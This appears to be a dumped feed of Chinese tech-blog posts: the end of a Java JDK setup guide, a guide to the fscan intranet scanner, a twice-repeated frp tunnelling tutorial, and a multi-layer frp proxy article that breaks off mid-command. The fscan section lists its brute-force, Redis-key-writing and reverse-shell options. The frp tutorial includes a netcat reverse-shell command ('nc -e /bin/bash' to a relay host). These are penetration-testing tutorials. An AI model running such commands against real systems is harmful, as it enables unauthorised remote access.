File\Java\jre1.8.0_181</p><p>也就是说刚才安装的是JDK(开发)，现在安装的是JRE(运行)，路径建议是将这两个安装到同一个目录下。也就是说，如果第一个路径选择的是：X:\aaa\bbb\jdk1.8.0_181</p><p>第二个安装路径最好是：X:\aaa\bbb\jre1.8.0_181 这是为了便于环境变量值的书写方便。</p><p>接下来点击下一步直到最后完成安装（盗图）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3755ac72fdd1d8d9d26622efb8e508b6.png"></p><hr><ul><li><h2 id="配置java环境变量"><a href="#配置java环境变量" class="headerlink" title="配置java环境变量"></a><strong>配置java环境变量</strong></h2></li></ul><p>打开系统设置，点击高级程序设置</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1ebf8874121afb139efd9032e1b4bbb7.png"></p><p>然后点击环境变量</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8fa444efe5bf60af64814737d521fac9.png"></p><p>打开环境变量界面以后 点击下方的新建（注意：下方系统变量的新建按钮）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/11522906f64f7f5066cb5fc20e01ea56.png"></p><h4 id="JAVA-HOME变量"><a href="#JAVA-HOME变量" class="headerlink" title="JAVA_HOME变量"></a><em><strong>JAVA_HOME变量</strong></em></h4><p>新建JAVA_HOME变量（下方可复制）</p><pre><code>JAVA_HOME</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2dfb253322215a945b6a1f490f97fb39.png"></p><p>点击浏览目录，找到你刚才安装时第一次更改的路径（未修改的默认路径为  C:\Program Files\Java\jdk1.8.0_181 ）</p><p>(我的安装比较早，所以图片上显示的是jdk1.8.0_161)</p><p>然后点击确定。（注意：点击确定以后要检查一下，确保这个变量配置好了）</p><h4 id="Path变量"><a href="#Path变量" class="headerlink" title="Path变量"></a><em><strong>Path变量</strong></em></h4><p>找到系统变量中的path变量，选中，点击编辑</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/611a57651c8e21156c47450a94bfb278.png"></p><p>然后点击新建（下方可复制，此处跟前面路径无关）</p><pre><code>%JAVA_HOME%\bin</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8d74a24fa1c439d53c560ece1869b36c.png"></p><p>继续点击新建，为了确保jre（运行）在你使用javaIDE的时候不产生问题，再新建一个变量</p><pre><code>%JAVA_HOME%\jre\bin</code></pre><p>再次注意：必须全是英文状态下的字符。</p><p>点击确定，然后确定。打开path变量确认一下是否已经成功保存变量。</p><h4 id="ClassPath变量"><a href="#ClassPath变量" class="headerlink" title="ClassPath变量"></a><strong><em>ClassPath变量</em></strong></h4><p>方法和java-home一样，在初始界面点击新建（下方可复制）</p><pre><code>ClassPath.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; </code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4e032f61297e43c1260da49649c757e2.png"></p><p>点击确认，然后 关闭，重新打开，确认一下是否已经成功安装。</p><p>备注：目前笔者在查找比较确切的classpath变量环境的配置值。（网络上有各种版本）本文所用的配置值的依据底下有解释</p><h3 id="至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？"><a href="#至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？" class="headerlink" title="至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？"></a>至此，大家一致认为的Java环境变量就配置完成了。你看懂了吗？</h3><hr><h4 id="classpath变量配置的解释"><a href="#classpath变量配置的解释" class="headerlink" title="classpath变量配置的解释"></a>classpath变量配置的解释</h4><p>打开我的电脑中JDK的目录，找到以下文件；</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0ae7e4341cd3827be2fff2a4040277b4.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a810eb0d9c4af33ce91f53648da64e9e.png"></p><p>打开classpath变量所写的文件目录，发现如下文件。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f9881f4a3273294bd95c1ef0ae31d1eb.png"></p><p>编辑，新建到系统变量的一系列值，其实，也就相当于告诉你的电脑，你新安装的某种编程语言运行环境在这里，你通过这里的配置把你的电脑引导到所需文件夹下。JAVA语言运行需要通过虚拟机，所以配置环境变量是为了JAVA文件运行时，引导它到你指定的文件夹运行虚拟机。</p><p>所以，我的java环境classpath变量的配置值是正确的！</p><h4 id="java运行环境的验证"><a href="#java运行环境的验证" class="headerlink" title="java运行环境的验证"></a><em><strong>java运行环境的验证</strong></em></h4><p>敲击键盘的Windows + R 按键，打开运行提示框，输入cmd（command简写，打开“小黑框”）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/39e0c4ae39a16756c4da1577ac2625f3.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5fcb1ee6ae29fe53b921180877981d79.png"></p><p>输入java，验证java安装是否成功。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6ee7e8a7b79147f35b0deae0a13ede76.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/07e1f233282e9a3905869c806771433b.png"></p><p>输入javac</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a9974b5075171ac9ec12407c7b308387.png"></p><p>点击回车 </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/96db0b9ab3b1ec2ba7ab87a86bc191a1.png"></p><h4 id="验证完毕！"><a href="#验证完毕！" class="headerlink" title="验证完毕！"></a>验证完毕！</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/fscan%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/07/15/fscan%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="fscan工具的使用"><a href="#fscan工具的使用" class="headerlink" title="fscan工具的使用"></a>fscan工具的使用</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>1.简介</strong><br>fscan是一款用go语言编写的开源工具，一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br>按照软件官方的说法，该工具支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能</p><p><strong>2.命令介绍</strong></p><pre><code>cd fscan//进入fscan文件夹//执行在windows下为fscan.exe,linux下为./fscan//例如./fscan -h 192.168.101.1/24//启动fscan并扫描网段fscan.exe -h 192.168.x.x //默认使用全部模块fscan.exe -h 192.168.x.x -rf id_rsa.pub //redis 写私钥fscan.exe -h 192.168.x.x -c whoami //ssh爆破成功后，命令执行fscan.exe -h 192.168.x.x -m ms17010 //指定模块fscan.exe -h 192.168.x.x -m ssh -p 2222 //指定模块ssh和端口fscan.exe -h 192.168.x.x -h 192.168.1.1/24 //C段fscan.exe -h 192.168.x.x -h 192.168.1.1/16 //B段fscan.exe -h 192.168.x.x -h 192.168.1.1/8  //A段的192.x.x.1和192.x.x.254,方便快速查看网段信息fscan.exe -h 192.168.x.x -hf ip.txt //以文件导入</code></pre><p><strong>完整命令</strong></p><pre><code>  -c string        ssh命令执行  -cookie string        设置cookie  -debug int        多久没响应,就打印当前进度(default 60)  -domain string        smb爆破模块时,设置域名  -h string        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12  -hf string        读取文件中的目标  -hn string        扫描时,要跳过的ip: -hn 192.168.1.1/24  -m string        设置扫描模式: -m ssh (default &quot;all&quot;)  -no        扫描结果不保存到文件中  -nobr        跳过sql、ftp、ssh等的密码爆破  -nopoc        跳过web poc扫描  -np        跳过存活探测  -num int        web poc 发包速率  (default 20)  -o string        扫描结果保存到哪 (default &quot;result.txt&quot;)  -p string        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)  -pa string        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)  -path string        fcgi、smb romote file path  -ping        使用ping代替icmp进行存活探测  -pn string        扫描时要跳过的端口,as: -pn 445  -pocname string        指定web poc的模糊名字, -pocname weblogic  -proxy string        设置代理, -proxy http://127.0.0.1:8080  -user string        指定爆破时的用户名  -userf string        指定爆破时的用户名文件  -pwd string        指定爆破时的密码  -pwdf string        指定爆破时的密码文件  -rf string        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)  -rs string        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)  -silent        静默扫描,适合cs扫描时不回显  -sshkey string        ssh连接时,指定ssh私钥  -t int        扫描线程 (default 600)  -time int        端口扫描超时时间 (default 3)  -u string        指定Url扫描  -uf string        指定Url文件扫描  -wt int        web访问超时时间 (default 5)</code></pre><h2 id="二、打开启动工具"><a href="#二、打开启动工具" class="headerlink" title="二、打开启动工具"></a>二、打开启动工具</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0065c8a17b9af5022870d3f6f15b4832.png" alt="在这里插入图片描述"></p><h2 id="三、扫描主机"><a href="#三、扫描主机" class="headerlink" title="三、扫描主机"></a>三、扫描主机</h2><p>针对目标IP进行扫描，例如：对我个人的主机进行扫描<br>我的主机地址是：192.168.44.134<br>全模式扫描<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bc7dd85896cc75f11b93aa5da9b7503c.png" alt="在这里插入图片描述"></p><p><strong>关注</strong> 一下啦，公众号回复“ <strong>fscan</strong> ”获取工具<br><img src="https://i-blog.csdnimg.cn/blog_migrate/22452789ab0bb4ee05294521cf09b352.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/"/>
      <url>/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/</url>
      
        <content type="html"><![CDATA[<h1 id="frp内网穿透—将kali代理在公网中进行渗透测试"><a href="#frp内网穿透—将kali代理在公网中进行渗透测试" class="headerlink" title="frp内网穿透—将kali代理在公网中进行渗透测试"></a>frp内网穿透—将kali代理在公网中进行渗透测试</h1><h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><ul><li><pre><code>* 前言</code></pre><ul><li>Frp简介</li><li>准备工具</li><li>实现内网穿透</li><li><pre><code>  * frp服务端配置</code></pre><ul><li>frp客户端配置</li></ul></li><li>测试</li><li><pre><code>  * HTTP服务测试</code></pre><ul><li>ssh服务测试</li><li>反弹shell测试</li></ul></li><li>注意</li></ul></li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以 <strong>通过frp工具将 内网中的服务 映射到 公网IP地址的端口中</strong></p><blockquote><p>从前的日色变得慢，车，马，邮件都慢。</p></blockquote><h3 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h3><p>frp 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。<br>frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ea9dbcc6240952a9c82a5607f9c04b2.png" alt="在这里插入图片描述"></p><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><p>为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具</p><ul><li>公网服务器，这里我用的是CentOS7.6</li><li>frp服务端&#x2F;客户端工具，github下载</li><li>内网服务器或本机，这里我用的是kali2020虚拟机</li></ul><p><a href="https://github.com/fatedier/frp/releases">frp下载github链接</a><br><a href="https://github.com/fatedier/frp">frp说明github链接</a><br>这里也提供amd64架构的<a href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">网盘资源</a><br>链接：<a href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw</a><br>提取码：qwer<br><strong>frp工具服务端和客户端不需要分开下载，部署时选择服务端或客户端部署即可</strong></p><h3 id="实现内网穿透"><a href="#实现内网穿透" class="headerlink" title="实现内网穿透"></a>实现内网穿透</h3><h4 id="frp服务端配置"><a href="#frp服务端配置" class="headerlink" title="frp服务端配置"></a>frp服务端配置</h4><p>首先将下载好的frp工具上传到服务器【这里我用的FinalShell可以直接上传文件】，如果不方便的话也可以用wget下载，tar命令解压如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f027f1825235ff462d705db5c915d802.png" alt="在这里插入图片描述"></p><pre><code>[common]# 一、服务器的基本配置部分# 7000 是FRP服务端口，可以改bind_port = 7000# dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = frpadmin@2022# 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 7500# 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=frpToken@admin2022 # 二、添加的映射端口[common]# FRP服务器的公网ipserver_addr = 【这里写自己的公网服务器地址】#例如：server_addr = 1.1.1.1# FRP服务器的，服务端口，这个可以改，不过客户端的也要一起改才行。server_port = 7000# 三、转发端口：[test01]、[test02] 这些没有任何意义，就是大致描述这个端口作用。# 每增加一个转发端口，复制下面的两行，然后将[]里面的和vhost_http_port_03改了就行了。#[test01]#vhost_http_port = 9001 #[test02]#vhost_tcp_port = 1315#转发端口配置，实际测试这里影响不大，主要取决于客户端的配置vhost_http_port = 9001vhost_ssh_port = 9002vhost_tcp_port = 9003</code></pre><p>启动frp服务端如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/103b87b74ef1f95ea44a88c2a485c782.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5d1a5440df66109578dc029ca6c57efb.png" alt="在这里插入图片描述"></p><h4 id="frp客户端配置"><a href="#frp客户端配置" class="headerlink" title="frp客户端配置"></a>frp客户端配置</h4><p>同样的方式将frp工具上传到kali虚拟机中，这里要确保kali是能够正常联网的，同样用tar命令解压，配置frpc.ini文件如下：</p><pre><code># 客户端配置[common]server_addr = 【这里写自己的公网服务器地址】#例如：server_addr = 1.1.1.1server_port = 7000          #frp服务端口要和服务端设定的一致token = frpToken@admin2022  #token要和服务端一致# 配置http服务，可用于小程序开发、远程调试等，如果没有可以不写下面的[web]type = httplocal_ip = 0.0.0.0local_port = 80   #本地需要映射的端口custom_domains = 【这里写自己的公网服务器地址】remote_port = 9001 #映射到服务端的端口#kali ssh[ssh]type = tcplocal_ip = 0.0.0.0local_port = 22custom_domains = 【这里写自己的公网服务器地址】remote_port = 9002  #tcp msfconsole[tcp]type = tcplocal_ip = 0.0.0.0local_port = 9003custom_domains = 【这里写自己的公网服务器地址】remote_port = 9003</code></pre><p>kali上运行frp客户端如下，此时要确保frp服务端正常运行，看到我们配置的三个端口均正常映射，如果显示连接拒绝可以考虑在防火墙上放行对应端口<img src="https://i-blog.csdnimg.cn/blog_migrate/147dd9c563ad28dac001826c4ffdd066.png"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="HTTP服务测试"><a href="#HTTP服务测试" class="headerlink" title="HTTP服务测试"></a>HTTP服务测试</h4><p>此时在kali上用python开启一个http服务进行测试</p><pre><code>python3 -m http.server 80</code></pre><p>http服务正常开启<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3ccb7bf9a5f820d4da25a384a50031f.png" alt="在这里插入图片描述"></p><p>至此，我们可以通过访问公网IP的对应端口来访问内网服务器中对应的服务</p><h4 id="ssh服务测试"><a href="#ssh服务测试" class="headerlink" title="ssh服务测试"></a>ssh服务测试</h4><p>首先确保kali上正常开启了ssh服务，且frp服务端和客户端正常启动<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ad9b923eb068aa2a264eaf7df83eb5bd.png" alt="在这里插入图片描述"></p><h4 id="反弹shell测试"><a href="#反弹shell测试" class="headerlink" title="反弹shell测试"></a>反弹shell测试</h4><p>在kali中利用msf工具时为了反弹shell常常需要设定本地监听端口，而虚拟机中的kali由于没有公网地址因此较难对公网中的服务器展开测试，通过frp代理很好的解决了这个问题<br>在上面的配置中，我配置了一个基于tcp的9003端口，映射到虚拟机kali的9003端口作为反弹shell的监听端口，这样就能够利用虚拟机kali对公网服务器进行测试，具体展开测试如下：<br>首先在kali上开启监听<br><img src="https://i-blog.csdnimg.cn/blog_migrate/36e973dd873c1627ca0070ec0029d5ec.png" alt="在这里插入图片描述"><br>接下来用另一台能联网的服务器反弹shell</p><pre><code>nc -e /bin/bash 【frp服务器地址】 【frp映射TCP端口】例：nc -e /bin/bash 1.1.1.1 9003</code></pre><p>执行命令后成功在kali中接收到shell<br><img src="https://i-blog.csdnimg.cn/blog_migrate/26cfe0c2f2b11100ad0773c645dcf1f2.png" alt="在这里插入图片描述"><br>当然这里也可以用msf生成payload进行测试，这里就不再继续演示</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>利用frp穿透内网时需要注意，由于frp采用了C&#x2F;S架构，因此用户对于frp服务端映射端口的访问，在客户端看来都是本地的访问，相当于客户端的frp来访问自己的服务，再将流量转发出去，总结就是 <strong>frp客户端认为所有的访问均来自本地，不能知道真正的访问者IP</strong> ，frp服务端能够看到”真正”的访问者IP， <del>没准访问者也使用了代理</del><br>因此上面在访问HTTP或ssh时，kali虚拟机认为这些访问来自于本地的frp客户端，并不能知道真正的用户来自哪里，这对于frp客户端的安全策略将有更高的要求</p><p>若有其他疑问，欢迎评论区留言或与我联系~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="frp内网穿透—将kali代理在公网中进行渗透测试"><a href="#frp内网穿透—将kali代理在公网中进行渗透测试" class="headerlink" title="frp内网穿透—将kali代理在公网中进行渗透测试"></a>frp内网穿透—将kali代理在公网中进行渗透测试</h1><h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><ul><li><pre><code>* 前言</code></pre><ul><li>Frp简介</li><li>准备工具</li><li>实现内网穿透</li><li><pre><code>  * frp服务端配置</code></pre><ul><li>frp客户端配置</li></ul></li><li>测试</li><li><pre><code>  * HTTP服务测试</code></pre><ul><li>ssh服务测试</li><li>反弹shell测试</li></ul></li><li>注意</li></ul></li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以 <strong>通过frp工具将 内网中的服务 映射到 公网IP地址的端口中</strong></p><blockquote><p>从前的日色变得慢，车，马，邮件都慢。</p></blockquote><h3 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h3><p>frp 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。<br>frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ea9dbcc6240952a9c82a5607f9c04b2.png" alt="在这里插入图片描述"></p><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><p>为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具</p><ul><li>公网服务器，这里我用的是CentOS7.6</li><li>frp服务端&#x2F;客户端工具，github下载</li><li>内网服务器或本机，这里我用的是kali2020虚拟机</li></ul><p><a href="https://github.com/fatedier/frp/releases">frp下载github链接</a><br><a href="https://github.com/fatedier/frp">frp说明github链接</a><br>这里也提供amd64架构的<a href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">网盘资源</a><br>链接：<a href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw</a><br>提取码：qwer<br><strong>frp工具服务端和客户端不需要分开下载，部署时选择服务端或客户端部署即可</strong></p><h3 id="实现内网穿透"><a href="#实现内网穿透" class="headerlink" title="实现内网穿透"></a>实现内网穿透</h3><h4 id="frp服务端配置"><a href="#frp服务端配置" class="headerlink" title="frp服务端配置"></a>frp服务端配置</h4><p>首先将下载好的frp工具上传到服务器【这里我用的FinalShell可以直接上传文件】，如果不方便的话也可以用wget下载，tar命令解压如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f027f1825235ff462d705db5c915d802.png" alt="在这里插入图片描述"></p><pre><code>[common]# 一、服务器的基本配置部分# 7000 是FRP服务端口，可以改bind_port = 7000# dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = frpadmin@2022# 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 7500# 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=frpToken@admin2022 # 二、添加的映射端口[common]# FRP服务器的公网ipserver_addr = 【这里写自己的公网服务器地址】#例如：server_addr = 1.1.1.1# FRP服务器的，服务端口，这个可以改，不过客户端的也要一起改才行。server_port = 7000# 三、转发端口：[test01]、[test02] 这些没有任何意义，就是大致描述这个端口作用。# 每增加一个转发端口，复制下面的两行，然后将[]里面的和vhost_http_port_03改了就行了。#[test01]#vhost_http_port = 9001 #[test02]#vhost_tcp_port = 1315#转发端口配置，实际测试这里影响不大，主要取决于客户端的配置vhost_http_port = 9001vhost_ssh_port = 9002vhost_tcp_port = 9003</code></pre><p>启动frp服务端如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/103b87b74ef1f95ea44a88c2a485c782.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5d1a5440df66109578dc029ca6c57efb.png" alt="在这里插入图片描述"></p><h4 id="frp客户端配置"><a href="#frp客户端配置" class="headerlink" title="frp客户端配置"></a>frp客户端配置</h4><p>同样的方式将frp工具上传到kali虚拟机中，这里要确保kali是能够正常联网的，同样用tar命令解压，配置frpc.ini文件如下：</p><pre><code># 客户端配置[common]server_addr = 【这里写自己的公网服务器地址】#例如：server_addr = 1.1.1.1server_port = 7000          #frp服务端口要和服务端设定的一致token = frpToken@admin2022  #token要和服务端一致# 配置http服务，可用于小程序开发、远程调试等，如果没有可以不写下面的[web]type = httplocal_ip = 0.0.0.0local_port = 80   #本地需要映射的端口custom_domains = 【这里写自己的公网服务器地址】remote_port = 9001 #映射到服务端的端口#kali ssh[ssh]type = tcplocal_ip = 0.0.0.0local_port = 22custom_domains = 【这里写自己的公网服务器地址】remote_port = 9002  #tcp msfconsole[tcp]type = tcplocal_ip = 0.0.0.0local_port = 9003custom_domains = 【这里写自己的公网服务器地址】remote_port = 9003</code></pre><p>kali上运行frp客户端如下，此时要确保frp服务端正常运行，看到我们配置的三个端口均正常映射，如果显示连接拒绝可以考虑在防火墙上放行对应端口<img src="https://i-blog.csdnimg.cn/blog_migrate/147dd9c563ad28dac001826c4ffdd066.png"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="HTTP服务测试"><a href="#HTTP服务测试" class="headerlink" title="HTTP服务测试"></a>HTTP服务测试</h4><p>此时在kali上用python开启一个http服务进行测试</p><pre><code>python3 -m http.server 80</code></pre><p>http服务正常开启<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3ccb7bf9a5f820d4da25a384a50031f.png" alt="在这里插入图片描述"></p><p>至此，我们可以通过访问公网IP的对应端口来访问内网服务器中对应的服务</p><h4 id="ssh服务测试"><a href="#ssh服务测试" class="headerlink" title="ssh服务测试"></a>ssh服务测试</h4><p>首先确保kali上正常开启了ssh服务，且frp服务端和客户端正常启动<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ad9b923eb068aa2a264eaf7df83eb5bd.png" alt="在这里插入图片描述"></p><h4 id="反弹shell测试"><a href="#反弹shell测试" class="headerlink" title="反弹shell测试"></a>反弹shell测试</h4><p>在kali中利用msf工具时为了反弹shell常常需要设定本地监听端口，而虚拟机中的kali由于没有公网地址因此较难对公网中的服务器展开测试，通过frp代理很好的解决了这个问题<br>在上面的配置中，我配置了一个基于tcp的9003端口，映射到虚拟机kali的9003端口作为反弹shell的监听端口，这样就能够利用虚拟机kali对公网服务器进行测试，具体展开测试如下：<br>首先在kali上开启监听<br><img src="https://i-blog.csdnimg.cn/blog_migrate/36e973dd873c1627ca0070ec0029d5ec.png" alt="在这里插入图片描述"><br>接下来用另一台能联网的服务器反弹shell</p><pre><code>nc -e /bin/bash 【frp服务器地址】 【frp映射TCP端口】例：nc -e /bin/bash 1.1.1.1 9003</code></pre><p>执行命令后成功在kali中接收到shell<br><img src="https://i-blog.csdnimg.cn/blog_migrate/26cfe0c2f2b11100ad0773c645dcf1f2.png" alt="在这里插入图片描述"><br>当然这里也可以用msf生成payload进行测试，这里就不再继续演示</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>利用frp穿透内网时需要注意，由于frp采用了C&#x2F;S架构，因此用户对于frp服务端映射端口的访问，在客户端看来都是本地的访问，相当于客户端的frp来访问自己的服务，再将流量转发出去，总结就是 <strong>frp客户端认为所有的访问均来自本地，不能知道真正的访问者IP</strong> ，frp服务端能够看到”真正”的访问者IP， <del>没准访问者也使用了代理</del><br>因此上面在访问HTTP或ssh时，kali虚拟机认为这些访问来自于本地的frp客户端，并不能知道真正的用户来自哪里，这对于frp客户端的安全策略将有更高的要求</p><p>若有其他疑问，欢迎评论区留言或与我联系~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA_proxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/"/>
      <url>/2025/07/15/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA_proxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="frp多层内网隧道搭建-proxychains及proxyfier多层代理详细设置"><a href="#frp多层内网隧道搭建-proxychains及proxyfier多层代理详细设置" class="headerlink" title="frp多层内网隧道搭建 proxychains及proxyfier多层代理详细设置"></a>frp多层内网隧道搭建 proxychains及proxyfier多层代理详细设置</h1><p>前言：派蒙师傅问了我一些内网隧道搭建的问题，我发现网上对于这块内容详细讲解较少，隧道搭建后又如何进行多层代理，新手经常蒙圈，又是就有了下面的文章。</p><p><strong>目录</strong></p><p>环境拓扑</p><p>第一层隧道</p><p>kali 启动 frps</p><p>PC1 启动 frpc</p><p>修改 etc&#x2F;proxychains4.conf</p><p>第二层隧道</p><p>PC1启动frps</p><p>PC2启动frpc</p><p>多层代理下Proxifier如何设置？</p><p>第三层隧道</p><p>PC2 启动frps</p><p>pc3启动frpc</p><hr><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4ce48ad457324c956bc9c27765672ad7.png"></p><pre><code>kali    192.168.112.128PC1    nat 192.168.112.152       vm1网卡 192.168.52.20PC2    vm1网卡 192.168.52.30      vm2网卡 192.168.54.40PC3    vm2网卡  192.168.54.50     vm3网卡 192.168.93.60PC4    VM3网卡   192.168.93.70</code></pre><h2 id="第一层隧道"><a href="#第一层隧道" class="headerlink" title="第一层隧道"></a>第一层隧道</h2><h3 id="kali-启动-frps"><a href="#kali-启动-frps" class="headerlink" title="kali 启动 frps"></a>kali 启动 frps</h3><p>配置文件如下</p><p>frps.ini</p><pre><code>[common]bind_addr = 0.0.0.0bind_port = 7000</code></pre><p>启动命令</p><pre><code>frps -c 